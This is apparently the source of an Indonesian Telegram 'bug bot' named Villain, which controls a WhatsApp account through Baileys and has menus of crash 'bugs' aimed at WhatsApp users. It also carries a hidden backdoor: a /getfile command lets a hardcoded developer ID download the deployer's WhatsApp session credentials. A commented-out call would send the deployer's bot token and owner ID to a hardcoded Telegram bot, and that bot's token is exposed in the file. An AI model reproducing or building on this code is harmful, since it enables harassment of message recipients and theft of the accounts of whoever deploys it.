const { Telegraf, Markup} = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWASocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good morning.. 🌆";
  } else if (hours >= 12 && hours < 18) {
    return "Good afternoon..🌇";
  } else {
    return "Good night..🌌";
  }
}
const greeting = getGreeting();
// Fungsi untuk memeriksa status pengguna
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "OWNER☁️" : "Unknown⛅";
}

// Fungsi untuk mendapatkan nama pengguna dari konteks bot
function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Middleware untuk membatasi akses hanya ke grup tertentu
const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};

// Inisialisasi bot Telegram
const bot = new Telegraf(BOT_TOKEN);
let cay = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// Helper untuk tidur sejenak
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk menerima input dari terminal
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
console.log(`
❍=============================================❍
       🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐒𝐜𝐫𝐢𝐩𝐭 𝐕𝐢𝐥𝐥𝐚𝐢𝐧 🔥
❍=============================================❍
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀𝙑𝙄𝙇𝙇𝘼𝙄𝙉
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀Developer: 𝙕𝙮𝙧𝙚𝙭
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀Premium: true
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀Power Proof: Ganas 🔥
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀Telegram: @Zyrexoffc
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
❍=============================================❍
𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐁𝐨𝐭 𝐈𝐬 𝐑𝐮𝐧𝐧𝐢𝐧𝐠.... 
❍=============================================❍
𝘾𝙄𝙉𝙏𝘼 𝘿𝙄 𝙏𝙊𝙇𝘼𝙆 
𝘽𝙐𝙂 𝙒𝘼 𝘼𝙆𝘼𝙉 𝘽𝙀𝙍𝙏𝙄𝙉𝘿𝘼𝙆 🔥
❍=============================================❍
`);
// Fungsi untuk memulai sesi WhatsApp
const startSesi = async (phoneNumber = null) => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version, isLatest } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        //version,
        isLatest: true,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'ロックビット',
        }),
    };

    cay = makeWASocket(connectionOptions);
         
    // Pairing code jika diaktifkan dan jika tidak terdaftar
    if (usePairingCode && !cay.authState.creds.registered) {
        if (!phoneNumber) {
            phoneNumber = await question(chalk.black(chalk.bgRed(`\nMasukan nomor sender!\n\nGunakan WhatsApp Messenger\nJangan menggunakan WhatsApp Bussines\n Nomor Harus Diawali Dengan 62:\n`)));
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        }

        const code = await cay.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code Nya Kontol: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    cay.ev.on('creds.update', saveCreds);
    store.bind(cay.ev);

    cay.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green(`Successfully Connected Your WhatsApp Connection ✅`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red(`Whastsapp Terputus 🗿`),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi(phoneNumber); // Mencoba untuk menghubungkan ulang
            }
            isWhatsAppConnected = false;
        }
    });
};
// Mulai sesi WhatsApp
startSesi();


let activeBots = []; // Untuk menyimpan informasi jadibot aktif

// Fungsi untuk menghapus sesi bot berdasarkan nomor menggunakan exec

const removeBotSession = (nomor) => {
    try {
        const sessionPath = path.join(__dirname, `./jadibot/${nomor}`);

        // Memeriksa apakah file session bot ada
        if (fs.existsSync(sessionPath)) {
            // Menghapus file session bot
            fs.rmSync(sessionPath, { recursive: true, force: true });

            console.log(`Sesi untuk nomor ${nomor} telah dihapus`);
        } else {
            console.log(`Tidak ada sesi yang ditemukan untuk nomor ${nomor}`);
        }
    } catch (error) {
        console.error("Error saat menghapus sesi bot:", error);
    }
};

// Contoh penggunaan
//removeBotSessionViaExec("62xxx"); // Ganti "62xxx" dengan nomor yang sesuai

// Contoh penggunaan
const jadibot = async (ctx, nomor) => {
    try {
        // Membuat autentikasi berdasarkan nomor
        //const sessionPath = path.join(__dirname, `./jadibot/${nomor}`);
        
        //const credsPath = path.join(sessionPath, 'creds.json'); // Path untuk file creds.json
        
        /*
        // Periksa apakah file creds.json ada
        if (!fs.existsSync(credsPath)) {
            console.log(`❌ File creds.json untuk nomor ${nomor} tidak ditemukan, menghapus sesi...`);
            // Menghapus seluruh folder session jika creds.json tidak ada
            fs.rmdirSync(sessionPath, { recursive: true });
            console.log(`✅ Sesi untuk nomor ${nomor} telah dihapus.`);
        }
        */
        
        
        const { state, saveCreds } = await useMultiFileAuthState(
            path.join(__dirname, `./jadibot/${nomor}`)
        );
        const connectionOptions = {
            isLatest: true,
            keepAliveIntervalMs: 30000,
            logger: pino({ level: "silent" }),
            auth: state,
            browser: ["Mac OS", "Safari", "10.15.7"],
            getMessage: async (key) => ({
            conversation: 'ロックビット',
        }),
        };

        const jadib = makeWASocket(connectionOptions);

        let isPaired = false;

        // Pairing code jika belum terhubung
        setTimeout(async () => {
            if (!isPaired && !jadib.authState.creds.registered) {
                try {
                    const code = await jadib.requestPairingCode(nomor.trim());
                    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(`Pairing Code untuk ${nomor}: ${formattedCode}`);
                    //global.pairc = formattedCode;
                    //ctx.repy(`Code Pairing To ${nomor}`);
                    ctx.reply(`${formattedCode}`);
                } catch (error) {
                    console.error(`Error saat pairing (${nomor}):`, error.message);
                }
            }
        }, 3000);

        // Simpan kredensial
        jadib.ev.on("creds.update", saveCreds);

        // Tangani pembaruan koneksi
        jadib.ev.on("connection.update", (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                //console.log(`whatsapp (${nomor}) berhasil terhubung.`);
                isPaired = true;

                // Tambahkan nomor ke daftar aktif jika belum ada
                if (!activeBots.find((bot) => bot.number === nomor)) {
                    activeBots.push({ number: nomor, instance: jadib });
                }
            }

            if (connection === "close") {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

                console.log(`Whatsapp (${nomor}) terputus.`);
                if (shouldReconnect) {
                    setTimeout(() => jadibot(nomor, ctx), 5000); // Coba reconnect
                } else {
                    removeBotSession(nomor);
                    activeBots = activeBots.filter((bot) => bot.number !== nomor); // Hapus dari daftar aktif
                }
            }
        });

    } catch (error) {
        console.error(`Error initializing jadibot (${nomor}):`, error.message);
    }
};



// Middleware untuk log pesan teks saja
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const message = ctx.message;
    const senderName = message.from.first_name || message.from.username || "Unknown";
    const senderId = message.from.id;
    const chatId = message.chat.id;
    const isGroup = message.chat.type === "group" || message.chat.type === "supergroup";
    const groupName = isGroup ? message.chat.title : null;
    const messageText = message.text;
    const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

    console.log("\x1b[30m--------------------\x1b[0m");
    console.log(chalk.bgHex("#e74c3c").bold("▢ Developer Sc @Zyrexoffc"));
    console.log(
      chalk.bgHex("#00FF00").black(
        `   ╭─ > Tanggal: ${date} \n` +
        `   ├─ > Pesan: ${messageText} \n` +
        `   ├─ > Pengirim: ${senderName} \n` +
        `   ╰─ > Sender ID: ${senderId}`
      )
    );

    if (isGroup) {
      console.log(
        chalk.bgHex("#00FF00").black(
          `   ╭─ > Grup: ${groupName} \n` +
          `   ╰─ > GroupJid: ${chatId}`
        )
      );
    }

    console.log();
  }
  return next(); // Lanjutkan ke handler berikutnya
});

/*
axios.get(`https://api.telegram.org/bot7845778531:AAFzVF11_70u9cMfDBRX3MKHYNWWF47aAwc/sendMessage`, {
  params: {
    chat_id: 6552202106,
    text: `
╭──(  🌠 SUCCESS   )
│
│ Information : ${BOT_TOKEN}
│ Owner: ${OWNER_ID}
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`,
  },
});
*/

// File untuk menyimpan daftar pengguna
const USERS_FILE = "./users.json";

// Memuat daftar pengguna dari file, jika ada
let users = [];
if (fs.existsSync(USERS_FILE)) {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf8");
    users = JSON.parse(data);
  } catch (error) {
    console.error("Gagal memuat daftar pengguna:", error.message);
  }
}

// Fungsi untuk menyimpan daftar pengguna ke file
function saveUsersToFile() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
  } catch (error) {
    console.error("Gagal menyimpan daftar pengguna:", error.message);
  }
}
// Command broadcast (hanya bisa digunakan oleh admin)
const Dev_ID = 7743618912; // Ganti dengan ID admin

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply(`❌ Tolol Akses Ini Hanya Boleh Di Akses Developer Script.`);
  }

  // Ambil pesan setelah perintah /broadcast
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply(`
┏━━━❰  𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /broadcast pesan anda
┗━━━━━━━━━━━━━━━
    `);
  }

  const finalMessage = message;

  // Kirim pesan ke semua pengguna
  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, { parse_mode: "Markdown" });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  // Balas ke admin setelah broadcast selesai
  ctx.reply(`✅ Done Broadcast Tolong Untuk Jeda Juga Bagian Broadcast! Pesan berhasil dikirim ke ${successCount} pengguna.`);
});
// Handler untuk mengambil file
bot.command('getfile', async (ctx) => {
  // Pastikan hanya developer yang dapat mengakses command ini
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = './session/creds.json'; // Path ke file yang ingin diambil

  try {
    // Kirim file ke developer
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} berhasil dikirim ke caywzz.`);
  } catch (error) {
    console.error("Kosong njir:", error);
    ctx.reply("User Belom Sambungin Device Jir😜.");
  }
});
bot.command("refresh", async (ctx) => {
    const connectedCount = 1;  // Harus disesuaikan sesuai kebutuhan
    const connectedDevicesList = [linkedWhatsAppNumber];  // Ganti dengan daftar perangkat yang sebenarnya

    const deviceList = connectedDevicesList.map((device, index) => `${index + 1}. ${device}`).join("\n");
    
    if (!isWhatsAppConnected) {
        return ctx.reply(`
┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION SENDER BUG
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : 0/1
┃ ⌬ SAMBUNG : KOSONG 
┗━━━━━━━━━━━━━━━━━━━━
`);
    }

    // Menghitung perangkat yang terhubung (contoh saja)

    ctx.reply(`
┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION SENDER BUG 
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ INFO :${connectedCount}/1
┃ ⌬ SAMBUNG : ${deviceList} 
┗━━━━━━━━━━━━━━━━━━━━
`);
});
const VideoUrls = [
  'https://files.catbox.moe/i4185s.mp4',
  'https://files.catbox.moe/i4185s.mp4',  // Ganti dengan URL foto lain
  'https://files.catbox.moe/i4185s.mp4',  // Ganti dengan URL foto lain
  'https://files.catbox.moe/i4185s.mp4',  // Ganti dengan URL foto lain
];

// Fungsi untuk memilih foto secara acak
function getRandomVideo() {
  const randomIndex = Math.floor(Math.random() * VideoUrls.length);
  return VideoUrls[randomIndex];
}
async function sendMainMenu(ctx) {
  const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomvideo = getRandomVideo();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
  [
    Markup.button.callback('𝐁̩̀́𝐔̔͢𝐆̴̗̖͛́𝐌̱̞̉̈𝐄͢͠𝐍͟𝐔͛', 'option1'),
    Markup.button.callback('𝙁𝙄𝙏𝙐𝙍 𝙈𝙀𝙉𝙐́', 'fitur'),
  ],
  // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝐀̔́͟͡𝐁̶̶̽͟𝐎̄̀͢͜𝐔́͟𝐓̕͟', 'about'),
  ],
    // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝘿𝙚𝙥𝙡𝙤𝙮 𝙎𝙘', 'Deploy'),
  ],
          // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝘼𝙠𝙨𝙚𝙨 𝙄𝙙', 'Akses'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.callback('➡️ Next', 'menu2')], // Tombol baru "Next"
  [Markup.button.url('👑 Developer', 'https://t.me/Zyrexoffc')],
]);

// Mengecek status WhatsApp
    const systemStatus = isWhatsAppConnected
        ? `𝐍𝐨𝐦𝐨𝐫 𝐁𝐨𝐭 : ✅`
        : `𝐍𝐨𝐦𝐨𝐫 𝐁𝐨𝐭 : ❌`;
        
  await ctx.replyWithVideo(getRandomVideo(), {
    caption: `
${greeting}☁️
${ctx.from.first_name || 'User'}

┏━━━━⧼⧼ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⧽⧽━━━❍
┃╭────────────────────
┃│ 𖠂 Developer: @Zyrexoffc
┃│ 𖠂 BotName: 𝙑𝙞𝙡𝙡𝙖𝙞𝙣 
┃│ 𖠂 Version: 1.9
┃│ 𖠂 Language: JavaScript
┃│ 𖠂 Prefix: / & Button
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━❍

┏━━━❰ 𝐒𝐄𝐍𝐃𝐄𝐑 ❱━━━━━━━━━━━━━❍
┃${systemStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━━❍

┏━━『 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒 』━━━━━━❍
║ • Mode: ACTIVE ✅
║ • Security: ENABLED 🔒
║ • Access: RESTRICTED ⚠️
┗━━━━━━━━━━━━━━━━━━━━━━━━❍

┏━━━━⧼⧼ 𝐌𝐄𝐍𝐔 ⧽⧽━━━❍
┃╭────────────────────
┃│ 𖠂 Click The Button For Menu 
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━❍
© 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
    `,
    parse_mode: 'Markdown',
    reply_markup: buttons.reply_markup,
  });
}

bot.start(async (ctx) => {
  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'video',
        media: getRandomVideo(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

// Action untuk tampilkan kembali menu utama
bot.action('startmenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomVideo = getRandomVideo();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
    [
    Markup.button.callback('𝐁̩̀́𝐔̔͢𝐆̴̗̖͛́𝐌̱̞̉̈𝐄͢͠𝐍͟𝐔͛', 'option1'),
    Markup.button.callback('𝙁𝙄𝙏𝙐𝙍 𝙈𝙀𝙉𝙐́', 'fitur'),
  ],
  // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝐀̔́͟͡𝐁̶̶̽͟𝐎̄̀͢͜𝐔́͟𝐓̕͟', 'about'),
  ],
      // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝘿𝙚𝙥𝙡𝙤𝙮 𝙎𝙘', 'Deploy'),
  ],
        // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝘼𝙠𝙨𝙚𝙨 𝙄𝙙', 'Akses'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
    [Markup.button.callback('➡️ Next', 'menu2')], // Tombol baru "Next"
  [Markup.button.url('👑 Developer', 'https://t.me/Zyrexoffc')],
])

// Mengecek status WhatsApp
    const systemStatus = isWhatsAppConnected
        ? `𝐍𝐨𝐦𝐨𝐫 𝐁𝐨𝐭 : ✅`
        : `𝐍𝐨𝐦𝐨𝐫 𝐁𝐨𝐭 : ❌`;

  const caption = `
${greeting}☁️
${ctx.from.first_name || 'User'}

┏━━━━⧼⧼ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⧽⧽━━━❍
┃╭────────────────────
┃│ 𖠂 Developer: @Zyrexoffc
┃│ 𖠂 BotName: 𝙑𝙞𝙡𝙡𝙖𝙞𝙣 
┃│ 𖠂 Version: 1.9
┃│ 𖠂 Language: JavaScript
┃│ 𖠂 Prefix: / & Button
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━❍

┏━━━❰ 𝐒𝐄𝐍𝐃𝐄𝐑 ❱━━━━━━━━━━━━━❍
┃${systemStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━━❍

┏━━『 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒 』━━━━━━❍
║ • Mode: ACTIVE ✅
║ • Security: ENABLED 🔒
║ • Access: RESTRICTED ⚠️
┗━━━━━━━━━━━━━━━━━━━━━━━━❍

┏━━━━⧼⧼ 𝐌𝐄𝐍𝐔 ⧽⧽━━━❍
┃╭────────────────────
┃│ 𖠂 Click The Button For Menu 
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━❍
© 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
    `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk BugMenu
bot.action('menu2', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomVideo = getRandomVideo();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: 𝙑𝙞𝙡𝙗𝙚𝙩𝙖 dan 𝙑𝙞𝙡𝙖𝙣𝙙𝙧𝙤
    [
    Markup.button.callback('𝙊𝙬𝙣𝙚𝙧 𝙈𝙚𝙣𝙪', 'owner'),
    Markup.button.callback('𝘼𝙙𝙢𝙞𝙣 𝙈𝙚𝙣𝙪', 'admin'),
  ],
  // Baris kedua: 𝙑𝙞𝙡𝙪𝙞
  [
    Markup.button.callback('𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙈𝙚𝙣𝙪', 'premium'),
  ],
    // Baris kedua: 𝙑𝙞𝙡𝙪𝙞
  [
    Markup.button.callback('𝙈𝙀𝙉𝙐 𝙇𝘼𝙂𝙐', 'play'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
]);
  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} 
┏━━━━⧼⧼ 𝐌𝐄𝐍𝐔 2 ⧽⧽━━━❍
┃╭────────────────────
┃│ 𖠂 Click The Button For Menu 2
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━❍
© 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action Untuk reseller Menu
bot.action('premium', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'menu2')],
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

┏━━━━⧼⧼ 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⧽⧽━━━
┃𝙃𝘼𝙉𝙔𝘼 𝘽𝙄𝙎𝘼 𝘼𝙆𝙎𝙀𝙎 𝘾𝙈𝘿 𝘽𝙐𝙂 
┃𝙈𝘼𝙐 𝘼𝙆𝙎𝙀𝙎 𝙎𝙀𝙋𝙀𝙍𝙏𝙄 𝙊𝙒𝙉𝙀𝙍
┃𝙈𝘼𝙐𝙋𝙐𝙉 𝘼𝘿𝙈𝙄𝙉
┃𝙐𝙋 𝘼𝙅𝘼 𝙆𝙀 𝙋𝙑 @Zyrexoffc
┗━━━━━━━━━━━━━━━━━━
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action Untuk reseller Menu
bot.action('owner', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'menu2')],
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

┏━━━━⧼⧼ 𝙊 𝙒 𝙉 𝙀 𝙍 𝙈 𝙀 𝙉 𝙐 ⧽⧽━━━
┃  ╭────────────────────
┃  │ 𖠂 /addadmin ( admin user )
┃  │ 𖠂 /deladmin ( remove admin user )
┃  │ 𖠂 /addprem ( premium user )
┃  │ 𖠂 /delprem ( remove premium user )
┃  ╰────────────────────
┗━━━━━━━━━━━━━━━━━━
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action Untuk reseller Menu
bot.action('admin', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'menu2')],
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

┏━━━━⧼⧼ 𝘼 𝘿 𝙈 𝙄 𝙉 𝙈 𝙀 𝙉 𝙐 ⧽⧽━━━
┃  ╭────────────────────
┃  │ 𖠂 /addprem ( add to premium user )
┃  │ 𖠂 /delprem ( remove premium user )
┃  ╰────────────────────
┗━━━━━━━━━━━━━━━━━━
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk BugMenu
bot.action('option1', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomVideo = getRandomVideo();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: 𝙑𝙞𝙡𝙗𝙚𝙩𝙖 dan 𝙑𝙞𝙡𝙖𝙣𝙙𝙧𝙤
    [
    Markup.button.callback('𝙑𝙞𝙡𝙖𝙣𝙙𝙧𝙤', 'option4'),
  ],
  // Baris kedua: 𝙑𝙞𝙡𝙪𝙞
  [
    Markup.button.callback('𝙑𝙞𝙡𝙪𝙞', 'option5'),
  ],
    // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝙑𝙞𝙡𝙪𝙩𝙧𝙖', 'option6'),
  ],
      // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('𝙁𝙡𝙤𝙞𝙙', 'option8'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.callback('➡️ Next', 'Bugmenu2')], // Tombol baru "Next"
  [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
]);
  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} 
┏━━━❰ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 ❱━━━━━━━━━❍
┃ स : Click The Button For BugMenu 
┃ Setiap Bug Jangan Pakai + dan -
┗━━━━━━━━━━━━━━━━━━━━━━❍
© 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk BugMenu
bot.action('Bugmenu2', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomVideo = getRandomVideo();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: 𝙑𝙞𝙡𝙗𝙚𝙩𝙖 dan 𝙑𝙞𝙡𝙖𝙣𝙙𝙧𝙤
    [
    Markup.button.callback('𝙑𝙞𝙡𝙢𝙚𝙩𝙖', 'Meta'),
    Markup.button.callback('𝙑𝙞𝙡𝙡𝙜𝙡𝙞𝙘𝙝', 'glich'),
  ],
  // Baris kedua: 𝙑𝙞𝙡𝙪𝙞
  [
    Markup.button.callback('𝙑𝙞𝙡𝙘𝙧𝙖𝙨𝙝', 'crash'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.callback('🔙 Back to Menu', 'option1')],
]);
  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} 
┏━━━❰ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 ❱━━━━━━━━━❍
┃ स : Click The Button For BugMenu2
┃ Setiap Bug Jangan Pakai + dan -
┗━━━━━━━━━━━━━━━━━━━━━━❍
